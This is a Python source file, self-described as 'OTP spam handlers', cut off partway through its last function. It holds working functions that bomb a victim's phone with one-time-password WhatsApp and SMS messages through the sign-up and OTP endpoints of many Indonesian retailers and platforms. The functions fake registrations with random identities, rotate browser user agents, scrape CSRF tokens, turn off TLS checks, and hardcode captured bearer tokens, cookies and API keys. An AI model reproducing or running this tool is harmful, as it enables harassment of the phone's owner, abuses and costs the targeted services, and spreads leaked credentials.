#!/usr/bin/env python3
# handlers.py — OTP spam handlers
# semua target dalam satu file, normalize universal

import requests
import uuid
import random
import string
import time
import re
import hmac
import hashlib
import urllib.parse
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only, get_public_ip, extract_csrf, get_random_user_agent, get_headers_with_random_ua

RATE_LIMIT_KEYWORDS = ['rate limit', 'too many', 'try again', 'limit', 'exceeded', 'banned', 'blocked']


# ==================== NORMALIZE UNIVERSAL ====================
def normalize(no: str) -> dict:
    """
    Input apapun → semua format sekaligus.
    Terima: +62 8xx-xxxx-xxxx / 628xx / 08xx / 8xx / spasi / dash
    Return dict:
      - raw      : input asli
      - clean    : strip semua non-digit kecuali leading +
      - bare     : 8xxxxxxxxx   (tanpa apapun)
      - fmt_08   : 08xxxxxxxxx
      - fmt_62   : 628xxxxxxxxx
      - fmt_plus : +628xxxxxxxxx
    """
    no = no.strip()
    # hapus semua spasi dan dash
    no = re.sub(r'[\s\-]', '', no)
    # simpan clean (digit saja, pertahankan + di depan)
    clean = re.sub(r'[^\d+]', '', no)

    # derive bare
    bare = clean
    if bare.startswith('+628'):  bare = bare[3:]
    elif bare.startswith('+62'): bare = bare[3:]
    elif bare.startswith('628'): bare = bare[2:]
    elif bare.startswith('62'):  bare = bare[2:]
    elif bare.startswith('08'):  bare = bare[1:]
    elif bare.startswith('0'):   bare = bare[1:]
    # kalau masih ada + buang
    bare = bare.lstrip('+')

    return {
        'raw':      no,
        'clean':    clean,
        'bare':     bare,               # 8xxxxxxxxx
        'fmt_08':   '0'  + bare,        # 08xxxxxxxxx
        'fmt_62':   '62' + bare,        # 628xxxxxxxxx
        'fmt_plus': '+62' + bare,       # +628xxxxxxxxx
    }


# ==================== HANDLER 1: HRS-BRE ====================
def send_hrsbre_otp(phone_08):
    BASE_URL = "https://career.hrs-bre.site"
    SIGN_UP_PAGE = f"{BASE_URL}/auth/sign_up"
    SIGN_UP_URL = f"{BASE_URL}/auth/sign_up_action"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": "https://career.hrs-bre.site",
        "Referer": SIGN_UP_PAGE,
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }
    session = requests.Session()
    try:
        r = session.get(SIGN_UP_PAGE, headers=headers, timeout=15)
        if r.status_code != 200:
            return None, None
    except Exception:
        return None, None
    nik = ''.join(random.choices(string.digits, k=16))
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@" + random.choice(["gmail.com", "yahoo.com", "mailnesia.com"])
    username = ''.join(random.choices(string.ascii_letters, k=8))
    password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="nik"\r\n\r\n{nik}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="email"\r\n\r\n{email}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="whatsapp"\r\n\r\n{phone_08}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="username"\r\n\r\n{username}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="password"\r\n\r\n{password}\r\n'
        f"--{boundary}--\r\n"
    )
    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    try:
        resp = session.post(SIGN_UP_URL, headers=headers, data=body, timeout=15)
        return resp.status_code, resp.text
    except Exception:
        return None, None

# ==================== HANDLER 2: ERAFONE ====================
def send_erafone_otp(phone_number):
    API_URL = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
    headers = {
        "Host": "jeanne.eraspace.com",
        "otp-client": "erafone",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
        "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
        "otp-provider": "whatsapp",
        "signature": "6e1dbc2dfa881e02e91492ff28c585f12402691976621ee9c2552826bc423b6e",
        "content-length": "62",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "source": "erafone",
        "device-id": "c1aab237-131a-4965-9838-116eb9788000",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sms-client": "erafone",
        "otp-client": "erafone",
        "otp-provider": "whatsapp",
        "platform": "erafone-web",
        "Origin": "https://erafone.com",
        "Referer": "https://erafone.com/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    payload = {"identifier": phone_number, "type": "identifier_validation"}
    try:
        resp = requests.post(API_URL, headers=headers, json=payload, timeout=15)
        return resp.status_code, resp.json() if resp.headers.get('content-type','').startswith('application/json') else resp.text
    except Exception as e:
        return None, {"error": str(e)}

# ==================== HANDLER 5: HASHMICRO ====================
def send_hashmicro_otp(phone_number):
    name = 'popsa' + ''.join(random.choices(string.ascii_letters, k=5))
    email = f'{name.lower()}@gmail.com'
    company = 'PT ' + name
    return {
        'medium': '55', 'type_button': 'mulai-konsultasi', 'fullname': name,
        'phonenumber': phone_number, 'email': email, 'companyname': company,
        'company_size': 'small', 'solution': '43', 'industry': random.choice(['178', '179', '180']),
        'message': 'Test', 'country': '100', 'clr_id': random.choice(['mq51xj8x-WzwfG4IcQKi0c056', 'abc123']),
        'campaigndata': 'HashMicro', 'fvis': 'https://www.hashmicro.com/', 'sfpvis': 'https://www.hashmicro.com/',
        'blvis': 'https://www.hashmicro.com/id/terimakasih/', 'gclid': '', 'gbraid': '', 'wbraid': '',
        'campaign': '', 'pmax_counter': '0', 'ads_counter': '0', 'sitelink_counter': '0', 'fbads_counter': '0',
        'blog_counter': '0', 'gdn_counter': '0', 'source': '143',
        'user_agent': get_random_user_agent(),
        'duration_page': str(random.randint(100000, 900000)), 'blp_medium': '120', 'user_device': 'mobile',
        'scroll_depth': '100', 'userjourney': time.strftime('%Y-%m-%dT%H:%M:%S.000Z'),
        'visitorcountry': '100', 'lvis': 'https://www.hashmicro.com/id/tour-produk-gratis/?medium=web-form-header',
        'hmregion': '', 'conversion_tracked': 'Yes', 'fingerprint': uuid.uuid4().hex, 'scale': 'small',
        'position': '43', 'team': '6', 'honeypot': '', 'ipaddrs': get_public_ip(), 'uip': get_public_ip(),
        'OngoingId': '', 'provn': 'Jakarta'
    }

# ==================== HANDLER 7: INTERNET RAKYAT ====================
def send_internetrakyat_otp(phone_08):
    base_url = "https://internetrakyat.id"
    register_page = f"{base_url}/auth/register"
    api_url = f"{base_url}/api/app/auth/send-otp-register"
    headers = {
        "Host": "internetrakyat.id", "Connection": "keep-alive",
        "sec-ch-ua-platform": '"Android"', "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "Content-Type": "application/json", "x-api-key": "280999!FTTH", "sec-ch-ua-mobile": "?1",
        "Origin": "https://internetrakyat.id", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": register_page,
        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    session = requests.Session()
    try:
        session.get(register_page, headers={"User-Agent": get_random_user_agent()}, timeout=10)
    except Exception:
        pass
    payload = {"phone_number": phone_08}
    try:
        resp = session.post(api_url, headers=headers, json=payload, timeout=15)
        return resp
    except Exception:
        return None

# ==================== HANDLER 8: ULTRAMILK ====================
def send_ultramilk_register(phone_number):
    url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
    name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
    email = name.lower() + '@gmail.com'
    password = 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '@1'
    headers = {
        "Host": "ultramilk-clp.kata.ai", "sec-ch-ua-platform": '"Android"',
        "authorization": "Bearer undefined", "user-agent": get_random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "content-type": "application/json; charset=UTF-8", "sec-ch-ua-mobile": "?1",
        "origin": "https://www.icownicpatch.com", "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://www.icownicpatch.com/",
    }
    payload = {"name": name, "email": email, "password": password, "phone_number": phone_number, "portal": "IcownicPatch", "is_consent": True}
    resp = requests.post(url, json=payload, headers=headers, timeout=15)
    return resp

# ==================== HANDLER 13: AUTO2000 ====================
_AUTO2000_BASE = "https://auto2000.co.id"
_AUTO2000_STATIC_COOKIES = {
    "__Host-next-auth.csrf-token": "6ff0ca30a8e0b7cdf2ebeb246b5c506348a6c0a0683d3689748a3c8a0c0ec442%7Ce1dc0801bcf26c22a69618591d40c36ecac06d1d83f1e3c8889effed23712d94",
    "__Secure-next-auth.callback-url": "https%3A%2F%2Fauto2000.co.id",
    "mycookies": "s7",
    "cf_clearance": "N98be3dSIRPkCLpSR5oQrc.2aOa.Don0vY1mm_jWoAg-1792203597-1.2.1.1-VHjhhUwWD4UKc5.4n9d2Xzur6cpz2wxsqUauok2Lmln7dQwSjStBHAmMCqYUHrTFJY7lz1TnZJqx7GtXLOhZb_2FcifqE0ccEi7uNJGpQPydiEYFfLFAeVIoL7gox8DIapJFRMZl5tUO3aoWHSjPi7nJ40OVp47CBLwgCuGzRK76DH87KWq61DHPqeYDgdELCNs815vofPVH1Np57qZ08tdV66L4sN4YaIT3dj3xMONqRLBXt7VLKhjKw5ZcW_.dIPAAS7_MFbN3Yuqxy89hoe_GISpFWA2QpZywCw7MXw8_B3zSG3rqJC_7yXM4GHuLjfCfeq1nuUgBfAvYBjthg8ZNe3w0KTAvw60B1EKxm0Y",
}

def send_auto2000_otp(phone_08):
    session = requests.Session()
    for name, value in _AUTO2000_STATIC_COOKIES.items():
        session.cookies.set(name, value, domain="auto2000.co.id")
    base_headers = {
        "Host": "auto2000.co.id", "Connection": "keep-alive", "sec-ch-ua-platform": '"Windows"',
        "User-Agent": get_random_user_agent(), "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"',
        "sec-ch-ua-mobile": "?0", "Origin": _AUTO2000_BASE, "Referer": f"{_AUTO2000_BASE}/login",
        "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9",
    }
    system_token = None
    try:
        r = session.get(f"{_AUTO2000_BASE}/api/system-authentication", headers=base_headers, timeout=10, verify=False, allow_redirects=True)
        system_token = session.cookies.get("system_token", domain="auto2000.co.id")
        if not system_token:
            for c in session.cookies:
                if c.name == "system_token":
                    system_token = c.value
                    break
        if not system_token:
            try:
                d = r.json()
                system_token = d.get("token") or d.get("system_token") or (d.get("data") or {}).get("token")
            except Exception:
                pass
    except Exception:
        pass
    h = {**base_headers, "Content-Type": "application/json", "x-api-key": system_token or ""}
    payload = {"isCheckOtpLimit": True, "isLogin": False, "phoneNumber": phone_08, "uniqueID": phone_08}
    try:
        resp = session.post(f"{_AUTO2000_BASE}/api/customer/v1/saphybris/whatsapp/generate-otp", headers=h, json=payload, timeout=15, verify=False)
        return resp
    except Exception:
        return None

# ==================== HANDLER 14: ASTRA DAIHATSU ====================
def send_astra_daihatsu_otp(phone_62):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Origin": "https://www.astra-daihatsu.id",
        "Referer": "https://www.astra-daihatsu.id/register",
        "Sec-CH-UA": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "Sec-CH-UA-Mobile": "?1", "Sec-CH-UA-Platform": "Android",
        "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty", "X-Requested-With": "XMLHttpRequest",
    })
    phone_62 = phone_62.strip()
    if phone_62.startswith("08"):
        phone_62 = "62" + phone_62[1:]
    elif phone_62.startswith("8"):
        phone_62 = "62" + phone_62
    try:
        page = sess.get("https://www.astra-daihatsu.id/register", timeout=15)
        csrf = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"|<input\s+type="hidden"\s+name="_csrf"\s+value="([^"]+)"|([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})', page.text)
        csrf = next((x for x in csrf.groups() if x), None) if page.status_code == 200 and csrf else None
        csrf = csrf or "c5de9b78-1136-4a89-9cbd-e9aba82dfaef"
        resp = sess.post(
            "https://www.astra-daihatsu.id/otp/whatsapp/generate",
            headers={"Content-Type": "application/json; charset=UTF-8", "csrftoken": csrf, "Origin": "https://www.astra-daihatsu.id", "Referer": "https://www.astra-daihatsu.id/register", "User-Agent": get_random_user_agent()},
            json={"phoneNo": phone_62}, timeout=20,
        )
        return resp
    except requests.exceptions.RequestException as e:
        return None

# ==================== HANDLER 16: WATSONS ====================
def send_watsons_otp(phone_no_code):
    url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
    headers = {
        "Host": "api.watsons.co.id", "cache-control": "no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
        "sec-ch-ua-platform": '"Android"', "authorization": "bearer Pi_D6dqblYElXgy4mWOXjkLCaZg",
        "pragma": "no-cache",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "expires": "0", "queue-target": "https://www.watsons.co.id/id/register",
        "user-agent": get_random_user_agent(), "accept": "application/json, text/plain, */*",
        "content-type": "application/json", "vary": "*", "origin": "https://www.watsons.co.id",
        "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
        "referer": "https://www.watsons.co.id/", "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    cookies = {"authorization": "Pi_D6dqblYElXgy4mWOXjkLCaZg", "token_type": "guest", "PIM-SESSION-ID": "qxxKuEI5by58jmGd"}
    payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": phone_no_code, "type": "WHATSAPP"}
    try:
        resp = requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=15)
        return resp
    except Exception:
        return None

# ==================== HANDLER 17: 99.CO ====================
def send_99co_otp(phone_plus):
    token_static = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoiMWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6ImFlYTNhMDEzLTJmMDktNDU0Ni05M2Q5LWM1MmVkYWRiMGM0NSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiYWVhM2EwMTMtMmYwOS00NTQ2LTkzZDktYzUyZWRhZGIwYzQ1IiwiY29yZV91dWlkIjoiMmI4OTg0MzQtMjE3MC00MGRmLTgwNmYtN2I4ZWNjOGUwZjQ4IiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiIxOGU5ODcyMy0wOWY5LTRlMzEtYjQzYS1jOGVlMjAwZWVmNWIiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJoc2hoc2pzajEyMiIsImNvcmVfY3VzdG9tZXJfdXVpZCI6ImQ5MTI3NDBkLWNhYzYtNDYyYS04YmE1LTMzYWE1MDc2MDdjMiIsImVtYWlsIjoidHN0dHR0dHRndHR0QGdtYWlsLmNvbSJ9.CcZpFr2eggmtVoWpUPuWTYg2LQ-qxH0GV4yx9q1_ZnB4pt13JIbTclvEytnqdLl9w9d8BKzCeGIiEnf0oQZpbw"
    url = "https://www.99.co/id/api/biz/messaging/otp-events"
    sess = requests.Session()
    sess.headers.update({"User-Agent": get_random_user_agent(), "Accept-Language": "id,en-US;q=0.9", "Origin": "https://www.99.co", "Referer": "https://www.99.co/id"})
    try:
        r = sess.get("https://www.99.co/id", timeout=10)
        token = sess.cookies.get("_99-acs-token") or token_static
    except Exception:
        token = token_static
    headers = {
        "Host": "www.99.co", "Authorization": f"Bearer {token}", "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*", "Origin": "https://www.99.co",
        "Referer": "https://www.99.co/id", "User-Agent": sess.headers.get("User-Agent"),
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-platform": '"Android"', "sec-ch-ua-mobile": "?1",
    }
    payload = {"brand": "99id", "destination_address": phone_plus, "type_id": 2}
    return sess.post(url, headers=headers, json=payload, timeout=15)

# ==================== HANDLER 19: FASTWORK ====================
def send_fastwork_otp(phone_08):
    url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
    headers = {
        "Host": "api.fastwork.id", "sec-ch-ua-platform": '"Android"',
        "user-agent": get_random_user_agent(),
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "content-type": "application/json", "sec-ch-ua-mobile": "?1", "accept": "*/*",
        "origin": "https://fastwork.id", "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://fastwork.id/",
    }
    payload = {"phone_number": phone_08}
    return requests.post(url, json=payload, headers=headers, timeout=15)

# ==================== HANDLER 26: DUNIA GAMES ====================
def send_duniagames_otp(phone_08):
    p = normalize(phone_08)
    no_plus = p['fmt_plus']
    headers = {
        "Content-Type": "application/json", "Origin": "https://duniagames.co.id",
        "Referer": "https://duniagames.co.id/", "x-device": "85d3da46-4d56-4675-90fc-e27926c56de1",
        "User-Agent": get_random_user_agent(), "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    payload = {"phoneNumber": no_plus, "userName": p['fmt_08']}
    try:
        resp = requests.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp", headers=headers, json=payload, timeout=15, verify=False)
        return resp
    except Exception:
        return None

# ==================== HANDLER 27: TOKOPEDIA ====================
def send_tokopedia_otp(phone_08):
    p = normalize(phone_08)
    no = p['fmt_62']
    headers = {
        "Host": "gql.tokopedia.com", "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*", "User-Agent": get_random_user_agent(),
        "Origin": "https://www.tokopedia.com", "Referer": "https://www.tokopedia.com/",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    payload = {
        "operationName": "OTPRequest",
        "query": (
            "query OTPRequest($otpType: String!, $mode: String, $msisdn: String, "
            "$email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, "
            "$UserIDSigned: String, $Signature: String, $MsisdnEnc: String, "
            "$EmailEnc: String, $source: String) {\n"
            "  OTPRequest: OTPRequestV2(otpType: $otpType, mode: $mode, msisdn: $msisdn, "
            "email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, "
            "UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, "
            "MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) {\n"
            "    success\n    message\n    errorMessage\n    sse_session_id\n"
            "    list_device_receiver\n    error_code\n    message_title\n"
            "    message_sub_title\n    message_img_link\n    __typename\n  }\n}\n"
        ),
        "variables": {"msisdn": no, "MsisdnEnc": "", "EmailEnc": "", "otpType": "116", "mode": "whatsapp", "otpDigit": 6},
    }
    try:
        resp = requests.post("https://gql.tokopedia.com/graphql/OTPRequest", headers=headers, json=payload, timeout=15, verify=False)
        return resp
    except Exception:
        return None

# ==================== HANDLER 28: PIZZAHUT ====================
'''
import tls_client as _tls_client

_PH_BASE      = "https://api-prod.pizzahut.co.id"
_PH_SIGNATURE = "ae5ac5c8c7c217aa0e277eaec9b2589878a27dd49b2310b621cdf613d055c314"
_PH_CLIENT_ID = "b39773b0-435b-4f41-80e9-163eef20e0ab"

def send_pizzahut_otp(phone_input):
    p = normalize(phone_input)
    bare = p['bare']  # 8xxxxxxxxx

    device_id = f"{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:6]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:6]}"
    session = _tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)

    headers = {
        "accept":             "application/json",
        "accept-encoding":    "gzip, deflate, br, zstd",
        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
        "content-type":       "application/x-www-form-urlencoded",
        "origin":             "https://www.pizzahut.co.id",
        "priority":           "u=1, i",
        "referer":            "https://www.pizzahut.co.id/",
        "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"',
        "sec-ch-ua-mobile":   "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-site",
        "user-agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-channel":          "2",
        "x-client-id":        _PH_CLIENT_ID,
        "x-device-id":        device_id,
        "x-device-type":      "PC",
        "x-lang":             "en",
        "x-platform":         "WEBDESKTOP",
        "x-signature":        _PH_SIGNATURE,
    }

    payload = {
        "birthday":   f"{random.randint(1990,2002)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}",
        "email":      ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com",
        "first_name": ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize(),
        "last_name":  ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize(),
        "phone":      bare,
    }

    try:
        reg = session.post(f"{_PH_BASE}/customer/v5/customer/register", headers=headers, data=payload, timeout_seconds=15)
        if reg.status_code == 200:
            data = reg.json()
            key = (data.get("key") or (data.get("data") or {}).get("key") or (data.get("result") or {}).get("key"))
            if key:
                otp_payload = {"key": key, "type": 1}
                otp_headers = {**headers, "content-type": "application/json"}
                otp = session.post(f"{_PH_BASE}/customer/v1/customer/send-otp", headers=otp_headers, json=otp_payload, timeout_seconds=15)
                return otp.status_code, otp.text
        return reg.status_code, reg.text
    except Exception as e:
        return None, str(e)
'''
# ==================== HANDLER 29: MAPCLUB ====================
_MC_BASE        = "https://beryllium.mapclub.com"
_MC_GUEST_TOKEN = "eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwMzY1MmVlYS01ODZiLTQ0ZTgtOWM1Yi1hZDFkYzQ5ZTljODEiLCJleHBpcmVkIjoxNzkzNTgzMTg1NDI2LCJleHBpcmUiOjM2MDAsInBsYXRmb3JtIjoiV0VCIiwiaWF0IjoxNzkzNTc5NTg1LCJleHAiOjE3OTM1ODMxODV9.iGi2ZnmeRuHdE1nuiacpNnrZhOVoh1jyXvbdmy-Bvv38eyVbvaqEIGU7_3eh9tLRXJPnYpWwyZ8-5Ky7lnUDBQ"

def send_mapclub_otp(phone_input):
    p = normalize(phone_input)
    account = p['fmt_62']  # 628xxxxxxxxx

    def _headers(token=None):
        return {
            "accept":             "application/json",
            "accept-encoding":    "gzip, deflate, br, zstd",
            "accept-language":    "in-ID",
            "authorization":      f"Bearer {token or _MC_GUEST_TOKEN}",
            "client-platform":    "WEB",
            "client-timestamp":   str(int(time.time() * 1000)),
            "content-type":       "application/json",
            "origin":             "https://www.mapclub.com",
            "priority":           "u=1, i",
            "referer":            "https://www.mapclub.com/",
            "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
            "sec-ch-ua-mobile":   "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest":     "empty",
            "sec-fetch-mode":     "cors",
            "sec-fetch-site":     "same-site",
            "user-agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
        }

    sess = requests.Session()
    try:
        verif = sess.post(f"{_MC_BASE}/api/member/registration/verification", headers=_headers(), params={"account": account, "prefix": "62"}, timeout=15, verify=False)
        token = _MC_GUEST_TOKEN
        if verif.status_code == 200:
            d = verif.json()
            token = (d.get("token") or d.get("accessToken") or (d.get("data") or {}).get("token") or _MC_GUEST_TOKEN)
        otp = sess.post(f"{_MC_BASE}/api/member/registration/sms/otp?channel=WHATSAPP", headers=_headers(token), json={"account": account, "prefix": "62"}, timeout=15, verify=False)
        return otp.status_code, otp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 30: CMKCLUB ====================
def send_cmkclub_otp(phone_input):
    p = normalize(phone_input)
    bare = p['bare']
    BASE_URL = "https://member.cmkclub.com"
    VALIDATE_URL = f"{BASE_URL}/validate-mobile-number"
    sess = requests.Session()
    try:
        resp = sess.get(VALIDATE_URL, headers={"user-agent": get_random_user_agent(), "accept": "text/html,application/xhtml+xml,*/*;q=0.8", "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "none", "upgrade-insecure-requests": "1"}, timeout=15, verify=False)
        csrf = sess.cookies.get("csrftoken")
        if not csrf:
            match = re.search(r'csrfmiddlewaretoken.*?value=["\']([^"\']+)', resp.text)
            if match:
                csrf = match.group(1)
        if not csrf:
            return None, "csrf not found"
        resp2 = sess.post(VALIDATE_URL, headers={
            "user-agent": get_random_user_agent(), "content-type": "application/x-www-form-urlencoded",
            "origin": BASE_URL, "referer": VALIDATE_URL, "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate", "sec-fetch-site": "same-origin",
            "upgrade-insecure-requests": "1",
        }, data={"csrfmiddlewaretoken": csrf, "mobile_number": bare}, timeout=15, verify=False, allow_redirects=True)
        return resp2.status_code, resp2.url
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 31: BABYHAPPY DIAPERS ====================
_BH_PROVINSI = ["SUMATERA_UTARA","SUMATERA_BARAT","DKI_JAKARTA","JAWA_BARAT","JAWA_TENGAH","JAWA_TIMUR","BANTEN","BALI"]
_BH_KONDISI  = ["SEDANG_HAMIL","MEMILIKI_BAYI"]

def send_babyhappy_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    phone_8  = p['bare']   # 8xxxxxxxxx untuk resend
    BASE_URL  = "https://club.babyhappydiapers.com"
    first = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,7))).capitalize()
    last  = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,7))).capitalize()
    payload = {
        "nama_lengkap":   f"{first} {last}",
        "kondisi_ibu":    random.choice(_BH_KONDISI),
        "usia_kehamilan": random.randint(1, 9),
        "provinsi":       random.choice(_BH_PROVINSI),
        "privacy":        True,
        "subscribe":      False,
        "referral":       "",
        "phone":          phone_08,
        "refSource":      None,
    }
    headers = {
        "accept":             "application/json, text/plain, */*",
        "accept-encoding":    "gzip, deflate, br, zstd",
        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
        "content-type":       "application/json",
        "origin":             BASE_URL,
